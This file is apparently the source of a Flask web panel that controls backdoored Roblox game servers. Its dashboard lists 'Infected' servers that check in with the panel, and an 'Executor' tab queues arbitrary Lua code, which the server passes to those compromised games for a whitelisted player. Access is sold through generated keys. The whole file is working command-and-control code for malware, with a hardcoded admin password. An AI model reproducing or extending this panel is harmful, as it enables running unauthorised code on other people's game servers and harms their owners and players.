import requests, time, os, uuid, random, string
from flask import Flask, request, render_template_string, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "vantage_engine_fix_2026"
MASTER_ADMIN_PW = "SkibidiSigma" 

HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

global_servers = {} 
user_sessions = {}
valid_keys = {}

def generate_key():
    return "VANTAGE-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

BASE_CSS = """
:root { --gold: #ffd700; --bg: #050505; --card: rgba(15, 15, 15, 0.9); --border: rgba(255, 215, 0, 0.2); --accent: #bc13fe; }
* { box-sizing: border-box; transition: 0.3s; }
body { background: var(--bg); background-size: cover; background-position: center; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
.navbar { background: rgba(0,0,0,0.95); border-bottom: 2px solid var(--border); display: flex; justify-content: space-around; padding: 18px; z-index: 100; }
.nav-item { color: #444; cursor: pointer; font-weight: 900; font-size: 11px; text-transform: uppercase; letter-spacing: 2px; }
.active-nav { color: var(--gold); border-bottom: 2px solid var(--gold); text-shadow: 0 0 10px var(--gold); }
.viewport { flex: 1; padding: 25px; overflow-y: auto; }
.card { background: var(--card); border: 1px solid var(--border); padding: 20px; border-radius: 15px; backdrop-filter: blur(15px); margin-bottom: 15px; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; max-width: 1200px; margin: auto; }
.server-thumb { width: 100%; height: 130px; object-fit: cover; border-radius: 10px; border: 1px solid #222; margin-bottom: 10px; display: block; }
.server-info { font-size: 11px; margin-bottom: 8px; line-height: 1.4; }
.server-info b { color: var(--gold); }
.owner-tag { color: #555; font-size: 9px; text-transform: uppercase; letter-spacing: 1px; }
.btn { background: var(--gold); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; font-size: 11px; margin-top: 5px; }
.btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3); }
input, textarea { background: rgba(0,0,0,0.8); border: 1px solid var(--border); padding: 15px; color: #fff; width: 100%; border-radius: 12px; outline: none; margin-bottom: 10px; }
textarea { color: #0f0; font-family: 'Consolas', monospace; height: 350px; resize: none; border-left: 5px solid var(--gold); }
.aesthetic { --gold: var(--accent); --border: rgba(188, 19, 254, 0.4); }
.hidden { display: none !important; }
.key-badge { background: #222; padding: 10px; border-radius: 8px; font-family: monospace; border: 1px dashed var(--gold); margin: 5px 0; display: block; }
"""

DASH_HTML = """
<!DOCTYPE html><html><head><style>""" + BASE_CSS + """</style></head>
<body id="main_body" class="{{ 'aesthetic' if aesthetic else '' }}">
    {% if not logged_in %}
    <div style="display:flex; align-items:center; justify-content:center; height:100vh; flex-direction:column;">
        <div class="card" style="width:340px; text-align:center;">
            <h1 style="color:var(--gold);">INITIALIZE</h1>
            <form method="POST" action="/login">
                <input type="password" name="pw" placeholder="ENTER ACCESS KEY">
                <button class="btn">ENTER SYSTEM</button>
            </form>
        </div>
    </div>
    {% else %}
    <div class="navbar">
        <div class="nav-item active-nav" onclick="tab('live', this)">Infected</div>
        <div class="nav-item" onclick="tab('exec', this)">Executor</div>
        <div class="nav-item" onclick="tab('white', this)">Whitelist</div>
        <div class="nav-item" onclick="tab('settings', this)">Settings</div>
        {% if is_admin %}<div class="nav-item" style="color:#ff4444;" onclick="tab('admin', this)">Admin Panel</div>{% endif %}
    </div>
    <div class="viewport">
        <div id="live" class="tab"><div id="server_grid" class="grid"></div></div>
        <div id="exec" class="tab hidden"><div class="card" style="max-width: 700px; margin: auto;"><p style="font-size:11px;">TARGET: <b id="exec_target" style="color:var(--gold);">NONE</b></p><textarea id="code_area" placeholder="-- REQUIRE HERE"></textarea><button class="btn" onclick="execute()">RUN SERVER-SIDE</button></div></div>
        <div id="white" class="tab hidden"><div id="auth_ui" class="card" style="max-width: 400px; margin: auto; text-align: center;"><input id="w_input" placeholder="Roblox Username"><button class="btn" onclick="addWhite()">AUTHORIZE PLAYER</button><div id="profile_box" class="hidden" style="margin-top:20px;"><img id="p_img" src="" style="width:100px; border-radius:50%; border:2px solid var(--gold);"><h3 id="p_name" style="color:var(--gold);"></h3><button class="btn" style="background:#ff4444; color:#fff;" onclick="resetWhite()">RESET</button></div></div></div>
        <div id="settings" class="tab hidden"><div class="card" style="max-width: 450px; margin: auto;"><input id="bg_input" placeholder="Background URL"><button class="btn" onclick="setBg()">SAVE THEME</button><button class="btn" style="background:#111; color:#fff;" onclick="toggleAes()">TOGGLE AESTHETIC</button><button class="btn" style="background:#ff4444; color:#fff;" onclick="location.href='/logout'">LOGOUT</button></div></div>
        {% if is_admin %}<div id="admin" class="tab hidden"><div class="card" style="max-width: 500px; margin: auto;"><h2 style="color:#ff4444;">Admin Control</h2><button class="btn" onclick="genKey()">GENERATE ACCESS KEY</button><div id="key_list" style="margin-top:15px;"></div></div></div>{% endif %}
    </div>
    {% endif %}
<script>
    function tab(name, el) { document.querySelectorAll('.tab').forEach(t => t.classList.add('hidden')); document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active-nav')); document.getElementById(name).classList.remove('hidden'); el.classList.add('active-nav'); }
    function sync() {
        fetch('/api/global_signals').then(r => r.json()).then(data => {
            let sHtml = "";
            for(let id in data) { let s = data[id]; sHtml += `<div class="card"><img src="${s.thumb}" class="server-thumb"><div class="server-info"><b>GAME:</b> ${s.name}<br><b>OWNER:</b> <span class="owner-tag">${s.owner || 'UNKNOWN'}</span><br><b>PLAYERS:</b> ${s.p_count || 0} Active</div><button class="btn" onclick="window.location='roblox-player:1+launchmode:play+gameinstanceid:${id}+placeid:${s.place_id}'">JOIN SERVER</button></div>`; }
            document.getElementById('server_grid').innerHTML = sHtml;
        });
        fetch('/api/personal_data').then(r => r.json()).then(data => {
            if(data.whitelist) { document.getElementById('exec_target').innerText = data.whitelist.name; document.getElementById('p_img').src = data.whitelist.img; document.getElementById('p_name').innerText = data.whitelist.name; document.getElementById('profile_box').classList.remove('hidden'); document.getElementById('w_input').classList.add('hidden');
            } else { document.getElementById('exec_target').innerText = "NONE"; document.getElementById('profile_box').classList.add('hidden'); document.getElementById('w_input').classList.remove('hidden'); }
        });
    }
    function genKey() { fetch('/api/admin/gen_key', {method:'POST'}).then(r => r.json()).then(data => { document.getElementById('key_list').innerHTML += `<span class="key-badge">${data.key}</span>`; }); }
    function setBg() { const url = document.getElementById('bg_input').value; document.getElementById('main_body').style.backgroundImage = `url('${url}')`; fetch('/api/set_setting', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({bg: url})}); }
    function toggleAes() { fetch('/api/toggle_aesthetic', {method:'POST'}).then(() => location.reload()); }
    function addWhite() { fetch('/api/whitelist', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user: document.getElementById('w_input').value})}); }
    function resetWhite() { fetch('/api/reset', {method:'POST'}); }
    function execute() { fetch('/api/execute', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({code: document.getElementById('code_area').value})}).then(()=>alert("Transferring to Roblox...")); }
    if (document.getElementById('server_grid')) setInterval(sync, 2000);
</script></body></html>
"""

@app.route('/login', methods=['POST'])
def login():
    pw = request.form.get("pw")
    if pw == MASTER_ADMIN_PW:
        session['logged_in'], session['is_admin'], session['sid'] = True, True, "ADMIN_SESSION"
    elif pw in valid_keys:
        session['logged_in'], session['is_admin'], session['sid'] = True, False, str(uuid.uuid4())
        del valid_keys[pw]
    return redirect(url_for('index'))

@app.route('/logout')
def logout(): session.clear(); return redirect(url_for('index'))

@app.route('/')
def index():
    sid = session.get('sid')
    if sid and sid not in user_sessions: user_sessions[sid] = {"whitelist": None, "queue": [], "aesthetic": False, "bg": ""}
    data = user_sessions.get(sid, {})
    return render_template_string(DASH_HTML, logged_in=session.get('logged_in'), is_admin=session.get('is_admin'), aesthetic=data.get('aesthetic'))

@app.route('/api/admin/gen_key', methods=['POST'])
def admin_gen():
    if not session.get('is_admin'): return jsonify({}), 403
    new_key = generate_key(); valid_keys[new_key] = "active"
    return jsonify({"key": new_key})

@app.route('/api/global_signals')
def get_global(): return jsonify(global_servers)

@app.route('/api/personal_data')
def get_personal(): return jsonify(user_sessions.get(session.get('sid'), {}))

@app.route('/api/whitelist', methods=['POST'])
def add_white():
    sid = session.get('sid')
    user = request.json.get("user")
    r = requests.post("https://users.roblox.com/v1/usernames/users", json={"usernames": [user]}, headers=HEADERS).json()
    if r.get("data") and sid:
        uid = r["data"][0]["id"]
        img = requests.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={uid}&size=150x150&format=Png", headers=HEADERS).json()["data"][0]["imageUrl"]
        user_sessions[sid]["whitelist"] = {"name": r["data"][0]["requestedUsername"], "img": img}
    return jsonify({"ok": True})

@app.route('/api/reset', methods=['POST'])
def reset_white():
    sid = session.get('sid')
    if sid: user_sessions[sid]["whitelist"] = None
    return jsonify({"ok": True})

@app.route('/api/execute', methods=['POST'])
def run_exec():
    sid = session.get('sid')
    if sid: user_sessions[sid]["queue"].append(request.json.get("code"))
    return jsonify({"ok": True})

@app.route('/api/toggle_aesthetic', methods=['POST'])
def toggle_aes():
    sid = session.get('sid')
    if sid: user_sessions[sid]["aesthetic"] = not user_sessions[sid].get("aesthetic", False)
    return jsonify({"ok": True})

@app.route('/roblox/sync', methods=['POST'])
def roblox_sync():
    data = request.json
    jid = data.get("jobId") or f"G_{data.get('game_id')}"
    if jid not in global_servers:
        t = requests.get(f"https://thumbnails.roblox.com/v1/places/gameicons?placeIds={data.get('game_id')}&size=150x150&format=Png", headers=HEADERS).json()
        global_servers[jid] = {"thumb": t["data"][0]["imageUrl"] if t.get("data") else "", "place_id": data.get("game_id")}
    
    global_servers[jid].update({"name": data.get("name"), "owner": data.get("owner"), "p_count": len(data.get("players", [])), "last_ping": time.time()})
    global_servers.update({k: v for k, v in global_servers.items() if time.time() - v.get('last_ping', 0) < 20})

    all_cmds = []
    players = [p.lower().strip() for p in data.get("players", [])]
    
    for sid, info in user_sessions.items():
        if info["whitelist"]:
            target_name = info["whitelist"]["name"].lower().strip()
            if target_name in players:
                for c in info["queue"]:
                    all_cmds.append({"user": info["whitelist"]["name"], "code": c})
                user_sessions[sid]["queue"] = []
            
    return jsonify({"commands": all_cmds})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
